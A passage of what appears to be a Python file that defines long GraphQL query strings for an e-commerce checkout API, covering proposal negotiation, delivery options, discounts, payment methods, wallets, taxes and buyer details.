DraftOrderAttributions{userIdentifier:userId sourceName locationIdentifier:locationId __typename}__typename}__typename}saleAttributions{attributions{...on SaleAttribution{recipient{...on StaffMember{id __typename}...on Location{id __typename}...on PointOfSaleDevice{id __typename}__typename}targetMerchandiseLines{...FilledMerchandiseLineTargetCollectionFragment...on AnyMerchandiseLineTargetCollection{any __typename}__typename}__typename}__typename}__typename}managedByMarketsPro captcha{...on Captcha{provider challenge sitekey token __typename}...on PendingTerms{taskId pollDelay __typename}__typename}cartCheckoutValidation{...on PendingTerms{taskId pollDelay __typename}__typename}alternativePaymentCurrency{...on AllocatedAlternativePaymentCurrencyTotal{total{amount currencyCode __typename}paymentLineAllocations{amount{amount currencyCode __typename}stableId __typename}__typename}__typename}isShippingRequired __typename}fragment ProposalDeliveryExpectationFragment on DeliveryExpectationTerms{__typename...on FilledDeliveryExpectationTerms{deliveryExpectations{minDeliveryDateTime maxDeliveryDateTime deliveryStrategyHandle brandedPromise{logoUrl darkThemeLogoUrl lightThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name handle __typename}deliveryOptionHandle deliveryExpectationPresentmentTitle{short long __typename}promiseProviderApiClientId signedHandle returnability __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment RedeemablePaymentMethodFragment on RedeemablePaymentMethod{redemptionSource redemptionContent{...on ShopCashRedemptionContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}__typename}redemptionPaymentOptionKind redemptionId destinationAmount{amount currencyCode __typename}sourceAmount{amount currencyCode __typename}__typename}...on StoreCreditRedemptionContent{storeCreditAccountId __typename}...on CustomRedemptionContent{redemptionAttributes{key value __typename}maskedIdentifier paymentMethodIdentifier __typename}__typename}__typename}fragment UiExtensionInstallationFragment on UiExtensionInstallation{extension{approvalScopes{handle __typename}capabilities{apiAccess networkAccess blockProgress collectBuyerConsent{smsMarketing customerPrivacy __typename}__typename}apiVersion appId appUrl preloads{target namespace value __typename}appName extensionLocale extensionPoints name registrationUuid scriptUrl translations uuid version __typename}__typename}fragment CustomerCreditCardPaymentMethodFragment on CustomerCreditCardPaymentMethod{cvvSessionId paymentMethodIdentifier token displayLastDigits brand defaultPaymentMethod deletable requiresCvvConfirmation firstDigits billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}fragment PaypalBillingAgreementPaymentMethodFragment on PaypalBillingAgreementPaymentMethod{paymentMethodIdentifier token billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}fragment PaymentLines on PaymentLine{stableId specialInstructions amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt paymentMethod{...on DirectPaymentMethod{sessionId paymentMethodIdentifier creditCard{...on CreditCard{brand lastDigits name __typename}__typename}paymentAttributes __typename}...on GiftCardPaymentMethod{code balance{amount currencyCode __typename}__typename}...on RedeemablePaymentMethod{...RedeemablePaymentMethodFragment __typename}...on WalletsPlatformPaymentMethod{name walletParams __typename}...on WalletPaymentMethod{name walletContent{...on ShopPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}sessionToken paymentMethodIdentifier __typename}...on PaypalWalletContent{paypalBillingAddress:billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}email payerId token paymentMethodIdentifier acceptedSubscriptionTerms expiresAt merchantId __typename}...on ApplePayWalletContent{data signature version lastDigits paymentMethodIdentifier header{applicationData ephemeralPublicKey publicKeyHash transactionId __typename}__typename}...on GooglePayWalletContent{signature signedMessage protocolVersion paymentMethodIdentifier __typename}...on FacebookPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}containerData containerId mode paymentMethodIdentifier __typename}...on ShopifyInstallmentsWalletContent{autoPayEnabled billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}disclosureDetails{evidence id type __typename}installmentsToken sessionToken paymentMethodIdentifier __typename}__typename}__typename}...on LocalPaymentMethod{paymentMethodIdentifier name additionalParameters{...on IdealPaymentMethodParameters{bank __typename}__typename}__typename}...on PaymentOnDeliveryMethod{additionalDetails paymentInstructions paymentMethodIdentifier __typename}...on OffsitePaymentMethod{paymentMethodIdentifier name __typename}...on CustomPaymentMethod{id name additionalDetails paymentInstructions paymentMethodIdentifier __typename}...on CustomOnsitePaymentMethod{paymentMethodIdentifier name paymentAttributes __typename}...on ManualPaymentMethod{id name paymentMethodIdentifier __typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on CustomerCreditCardPaymentMethod{...CustomerCreditCardPaymentMethodFragment __typename}...on PaypalBillingAgreementPaymentMethod{...PaypalBillingAgreementPaymentMethodFragment __typename}...on NoopPaymentMethod{__typename}__typename}__typename}
"""

# QUERY_PROPOSAL_DELIVERY
QUERY_PROPOSAL_DELIVERY = """query Proposal($alternativePaymentCurrency:AlternativePaymentCurrencyInput,$delivery:DeliveryTermsInput,$discounts:DiscountTermsInput,$payment:PaymentTermInput,$merchandise:MerchandiseTermInput,$buyerIdentity:BuyerIdentityTermInput,$taxes:TaxTermInput,$sessionInput:SessionTokenInput!,$checkpointData:String,$queueToken:String,$reduction:ReductionInput,$availableRedeemables:AvailableRedeemablesInput,$changesetTokens:[String!],$tip:TipTermInput,$note:NoteInput,$localizationExtension:LocalizationExtensionInput,$nonNegotiableTerms:NonNegotiableTermsInput,$scriptFingerprint:ScriptFingerprintInput,$transformerFingerprintV2:String,$optionalDuties:OptionalDutiesInput,$attribution:AttributionInput,$captcha:CaptchaInput,$poNumber:String,$saleAttributions:SaleAttributionsInput){session(sessionInput:$sessionInput){negotiate(input:{purchaseProposal:{alternativePaymentCurrency:$alternativePaymentCurrency,delivery:$delivery,discounts:$discounts,payment:$payment,merchandise:$merchandise,buyerIdentity:$buyerIdentity,taxes:$taxes,reduction:$reduction,availableRedeemables:$availableRedeemables,tip:$tip,note:$note,poNumber:$poNumber,nonNegotiableTerms:$nonNegotiableTerms,localizationExtension:$localizationExtension,scriptFingerprint:$scriptFingerprint,transformerFingerprintV2:$transformerFingerprintV2,optionalDuties:$optionalDuties,attribution:$attribution,captcha:$captcha,saleAttributions:$saleAttributions},checkpointData:$checkpointData,queueToken:$queueToken,changesetTokens:$changesetTokens}){__typename result{...on NegotiationResultAvailable{checkpointData queueToken buyerProposal{...BuyerProposalDetails __typename}sellerProposal{...ProposalDetails __typename}__typename}...on CheckpointDenied{redirectUrl __typename}...on Throttled{pollAfter queueToken pollUrl __typename}...on SubmittedForCompletion{receipt{...ReceiptDetails __typename}__typename}...on NegotiationResultFailed{__typename}__typename}errors{code localizedMessage nonLocalizedMessage localizedMessageHtml...on RemoveTermViolation{target __typename}...on AcceptNewTermViolation{target __typename}...on ConfirmChangeViolation{from to __typename}...on UnprocessableTermViolation{target __typename}...on UnresolvableTermViolation{target __typename}...on ApplyChangeViolation{target from{...on ApplyChangeValueInt{value __typename}...on ApplyChangeValueRemoval{value __typename}...on ApplyChangeValueString{value __typename}__typename}to{...on ApplyChangeValueInt{value __typename}...on ApplyChangeValueRemoval{value __typename}...on ApplyChangeValueString{value __typename}__typename}__typename}...on GenericError{__typename}...on PendingTermViolation{__typename}__typename}}__typename}}fragment BuyerProposalDetails on Proposal{buyerIdentity{...on FilledBuyerIdentityTerms{email phone customer{...on CustomerProfile{email __typename}...on BusinessCustomerProfile{email __typename}__typename}__typename}__typename}merchandiseDiscount{...ProposalDiscountFragment __typename}deliveryDiscount{...ProposalDiscountFragment __typename}delivery{...ProposalDeliveryFragment __typename}merchandise{...on FilledMerchandiseTerms{taxesIncluded merchandiseLines{stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}lineComponentsSource lineComponents{...MerchandiseBundleLineComponent __typename}components{...MerchandiseLineComponentWithCapabilities __typename}legacyFee __typename}__typename}__typename}runningTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalTaxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deferredTotal{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}subtotalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}taxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt __typename}hasOnlyDeferredShipping subtotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacySubtotalBeforeTaxesShippingAndFees{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}attribution{attributions{...on RetailAttributions{deviceId locationId userId __typename}...on DraftOrderAttributions{userIdentifier:userId sourceName locationIdentifier:locationId __typename}__typename}__typename}saleAttributions{attributions{...on SaleAttribution{recipient{...on StaffMember{id __typename}...on Location{id __typename}...on PointOfSaleDevice{id __typename}__typename}targetMerchandiseLines{...FilledMerchandiseLineTargetCollectionFragment...on AnyMerchandiseLineTargetCollection{any __typename}__typename}__typename}__typename}__typename}nonNegotiableTerms{signature contents{signature targetTerms targetLine{allLines index __typename}attributes __typename}__typename}__typename}fragment ProposalDiscountFragment on DiscountTermsV2{__typename...on FilledDiscountTerms{acceptUnexpectedDiscounts lines{...DiscountLineDetailsFragment __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment DiscountLineDetailsFragment on DiscountLine{allocations{...on DiscountAllocatedAllocationSet{__typename allocations{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}target{index targetType stableId __typename}__typename}}__typename}discount{...DiscountDetailsFragment __typename}lineAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}fragment DiscountDetailsFragment on Discount{...on CustomDiscount{title description presentationLevel allocationMethod targetSelection targetType signature signatureUuid type value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on CodeDiscount{title code presentationLevel allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on DiscountCodeTrigger{code __typename}...on AutomaticDiscount{presentationLevel title allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}fragment ProposalDeliveryFragment on DeliveryTerms{__typename...on FilledDeliveryTerms{intermediateRates progressiveRatesEstimatedTimeUntilCompletion shippingRatesStatusToken deliveryLines{destinationAddress{...on StreetAddress{handle name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on Geolocation{country{code __typename}zone{code __typename}coordinates{latitude longitude __typename}postalCode __typename}...on PartialStreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}__typename}targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}groupType deliveryMethodTypes selectedDeliveryStrategy{...on CompleteDeliveryStrategy{handle __typename}...on DeliveryStrategyReference{handle __typename}__typename}availableDeliveryStrategies{...on CompleteDeliveryStrategy{title handle custom description code acceptsInstructions phoneRequired methodType carrierName incoterms brandedPromise{logoUrl lightThemeLogoUrl darkThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name __typename}deliveryStrategyBreakdown{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}__typename}minDeliveryDateTime maxDeliveryDateTime deliveryPromisePresentmentTitle{short long __typename}displayCheckoutRedesign estimatedTimeInTransit{...on IntIntervalConstraint{lowerBound upperBound __typename}...on IntValueConstraint{value __typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}pickupLocation{...on PickupInStoreLocation{address{address1 address2 city countryCode phone postalCode zoneCode __typename}instructions name __typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}businessHours{day openingTime closingTime __typename}carrierCode carrierName handle kind name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}__typename}__typename}__typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment FilledMerchandiseLineTargetCollectionFragment on FilledMerchandiseLineTargetCollection{linesV2{...on MerchandiseLine{stableId quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on MerchandiseBundleLineComponent{stableId quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on MerchandiseLineComponentWithCapabilities{stableId quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}fragment DeliveryLineMerchandiseFragment on ProposalMerchandise{...on SourceProvidedMerchandise{__typename requiresShipping}...on ProductVariantMerchandise{__typename requiresShipping}...on ContextualizedProductVariantMerchandise{__typename requiresShipping sellingPlan{id digest name prepaid deliveriesPerBillingCycle subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}}...on MissingProductVariantMerchandise{__typename variantId}__typename}fragment SourceProvidedMerchandise on Merchandise{...on SourceProvidedMerchandise{__typename product{id title productType vendor __typename}productUrl digest variantId optionalIdentifier title untranslatedTitle subtitle untranslatedSubtitle taxable giftCard requiresShipping price{amount currencyCode __typename}deferredAmount{amount currencyCode __typename}image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}options{name value __typename}properties{...MerchandiseProperties __typename}taxCode taxesIncluded weight{value unit __typename}sku}__typename}fragment MerchandiseProperties on MerchandiseProperty{name value{...on MerchandisePropertyValueString{string:value __typename}...on MerchandisePropertyValueInt{int:value __typename}...on MerchandisePropertyValueFloat{float:value __typename}...on MerchandisePropertyValueBoolean{boolean:value __typename}...on MerchandisePropertyValueJson{json:value __typename}__typename}visible __typename}fragment ProductVariantMerchandiseDetails on ProductVariantMerchandise{id digest variantId title untranslatedTitle subtitle untranslatedSubtitle product{id vendor productType __typename}productUrl image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}properties{...MerchandiseProperties __typename}requiresShipping options{name value __typename}sellingPlan{id subscriptionDetails{billingInterval __typename}__typename}giftCard __typename}fragment ContextualizedProductVariantMerchandiseDetails on ContextualizedProductVariantMerchandise{id digest variantId title untranslatedTitle subtitle untranslatedSubtitle sku price{amount currencyCode __typename}product{id vendor productType __typename}productUrl image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}properties{...MerchandiseProperties __typename}requiresShipping options{name value __typename}sellingPlan{name id digest deliveriesPerBillingCycle prepaid subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}giftCard deferredAmount{amount currencyCode __typename}__typename}fragment LineAllocationDetails on LineAllocation{stableId quantity totalAmountBeforeReductions{amount currencyCode __typename}totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}unitPrice{price{amount currencyCode __typename}measurement{referenceUnit referenceValue __typename}__typename}allocations{...on LineComponentDiscountAllocation{allocation{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}__typename}__typename}__typename}fragment MerchandiseBundleLineComponent on MerchandiseBundleLineComponent{__typename stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}}fragment MerchandiseLineComponentWithCapabilities on MerchandiseLineComponentWithCapabilities{__typename stableId componentCapabilities componentSource merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}}fragment ProposalDetails on Proposal{merchandiseDiscount{...ProposalDiscountFragment __typename}deliveryDiscount{...ProposalDiscountFragment __typename}deliveryExpectations{...ProposalDeliveryExpectationFragment __typename}availableRedeemables{...on PendingTerms{taskId pollDelay __typename}...on AvailableRedeemables{availableRedeemables{paymentMethod{...RedeemablePaymentMethodFragment __typename}balance{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}availableDeliveryAddresses{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone handle label __typename}mustSelectProvidedAddress delivery{...on FilledDeliveryTerms{intermediateRates progressiveRatesEstimatedTimeUntilCompletion shippingRatesStatusToken deliveryLines{id availableOn destinationAddress{...on StreetAddress{handle name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on Geolocation{country{code __typename}zone{code __typename}coordinates{latitude longitude __typename}postalCode __typename}...on PartialStreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}__typename}targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}groupType selectedDeliveryStrategy{...on CompleteDeliveryStrategy{handle __typename}__typename}deliveryMethodTypes availableDeliveryStrategies{...on CompleteDeliveryStrategy{originLocation{id __typename}title handle custom description code acceptsInstructions phoneRequired methodType carrierName incoterms metafields{key namespace value __typename}brandedPromise{handle logoUrl lightThemeLogoUrl darkThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name __typename}deliveryStrategyBreakdown{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}__typename}minDeliveryDateTime maxDeliveryDateTime deliveryPromiseProviderApiClientId deliveryPromisePresentmentTitle{short long __typename}displayCheckoutRedesign estimatedTimeInTransit{...on IntIntervalConstraint{lowerBound upperBound __typename}...on IntValueConstraint{value __typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}pickupLocation{...on PickupInStoreLocation{address{address1 address2 city countryCode phone postalCode zoneCode __typename}instructions name distanceFromBuyer{unit value __typename}__typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}businessHours{day openingTime closingTime __typename}carrierCode carrierName handle kind name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}__typename}__typename}__typename}deliveryMacros{totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAmountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deliveryPromisePresentmentTitle{short long __typename}deliveryStrategyHandles id title totalTitle __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}__typename}payment{...on FilledPaymentTerms{availablePaymentLines{placements paymentMethod{...on PaymentProvider{paymentMethodIdentifier name brands paymentBrands orderingIndex displayName extensibilityDisplayName availablePresentmentCurrencies paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}checkoutHostedFields alternative supportsNetworkSelection __typename}...on OffsiteProvider{__typename paymentMethodIdentifier name paymentBrands orderingIndex showRedirectionNotice availablePresentmentCurrencies}...on CustomOnsiteProvider{__typename paymentMethodIdentifier name paymentBrands orderingIndex availablePresentmentCurrencies paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}}...on AnyRedeemablePaymentMethod{__typename availableRedemptionConfigs{__typename...on CustomRedemptionConfig{paymentMethodIdentifier paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}__typename}}orderingIndex}...on WalletsPlatformConfiguration{name configurationParams __typename}...on PaypalWalletConfig{__typename name clientId merchantId venmoEnabled payflow paymentIntent paymentMethodIdentifier orderingIndex clientToken}...on ShopPayWalletConfig{__typename name storefrontUrl paymentMethodIdentifier orderingIndex}...on ShopifyInstallmentsWalletConfig{__typename name availableLoanTypes maxPrice{amount currencyCode __typename}minPrice{amount currencyCode __typename}supportedCountries supportedCurrencies giftCardsNotAllowed subscriptionItemsNotAllowed ineligibleTestModeCheckout ineligibleLineItem paymentMethodIdentifier orderingIndex}...on FacebookPayWalletConfig{__typename name partnerId partnerMerchantId supportedContainers acquirerCountryCode mode paymentMethodIdentifier orderingIndex}...on ApplePayWalletConfig{__typename name supportedNetworks walletAuthenticationToken walletOrderTypeIdentifier walletServiceUrl paymentMethodIdentifier orderingIndex}...on GooglePayWalletConfig{__typename name allowedAuthMethods allowedCardNetworks gateway gatewayMerchantId merchantId authJwt environment paymentMethodIdentifier orderingIndex}...on AmazonPayClassicWalletConfig{__typename name orderingIndex}...on LocalPaymentMethodConfig{__typename paymentMethodIdentifier name displayName additionalParameters{...on IdealBankSelectionParameterConfig{__typename label options{label value __typename}}__typename}orderingIndex}...on AnyPaymentOnDeliveryMethod{__typename additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex name availablePresentmentCurrencies}...on ManualPaymentMethodConfig{id name additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex availablePresentmentCurrencies __typename}...on CustomPaymentMethodConfig{id name additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex availablePresentmentCurrencies __typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on CustomerCreditCardPaymentMethod{__typename expired expiryMonth expiryYear name orderingIndex...CustomerCreditCardPaymentMethodFragment}...on PaypalBillingAgreementPaymentMethod{__typename orderingIndex paypalAccountEmail...PaypalBillingAgreementPaymentMethodFragment}__typename}__typename}paymentLines{...PaymentLines __typename}billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}paymentFlexibilityPaymentTermsTemplate{id translatedName dueDate dueInDays type __typename}depositConfiguration{...on DepositPercentage{percentage __typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}poNumber merchandise{...on FilledMerchandiseTerms{taxesIncluded merchandiseLines{stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}lineComponentsSource lineComponents{...MerchandiseBundleLineComponent __typename}components{...MerchandiseLineComponentWithCapabilities __typename}legacyFee __typename}__typename}__typename}note{customAttributes{key value __typename}message __typename}scriptFingerprint{signature signatureUuid lineItemScriptChanges paymentScriptChanges shippingScriptChanges __typename}transformerFingerprintV2 buyerIdentity{...on FilledBuyerIdentityTerms{customer{...on GuestProfile{presentmentCurrency countryCode market{id handle __typename}shippingAddresses{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}...on CustomerProfile{id presentmentCurrency fullName firstName lastName countryCode market{id handle __typename}email imageUrl acceptsSmsMarketing acceptsEmailMarketing ordersCount phone billingAddresses{id default address{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}shippingAddresses{id default address{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}storeCreditAccounts{id balance{amount currencyCode __typename}__typename}__typename}...on BusinessCustomerProfile{checkoutExperienceConfiguration{editableShippingAddress __typename}id presentmentCurrency fullName firstName lastName acceptsSmsMarketing acceptsEmailMarketing countryCode imageUrl market{id handle __typename}email ordersCount phone __typename}__typename}purchasingCompany{company{id externalId name __typename}contact{locationCount __typename}location{id externalId name billingAddress{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}shippingAddress{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}__typename}phone email marketingConsent{...on SMSMarketingConsent{value __typename}...on EmailMarketingConsent{value __typename}__typename}shopPayOptInPhone rememberMe __typename}__typename}checkoutCompletionTarget recurringTotals{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}subtotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacySubtotalBeforeTaxesShippingAndFees{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}legacyRepresentProductsAsFees totalSavings{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}runningTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalTaxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deferredTotal{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}subtotalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}taxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt __typename}hasOnlyDeferredShipping subtotalBeforeReductions{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}duty{...on FilledDutyTerms{totalDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalTaxAndDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAdditionalFeesAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}tax{...on FilledTaxTerms{totalTaxAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalTaxAndDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAmountIncludedInTarget{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}exemptions{taxExemptionReason targets{...on TargetAllLines{__typename}__typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}tip{tipSuggestions{...on TipSuggestion{__typename percentage amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}}__typename}terms{...on 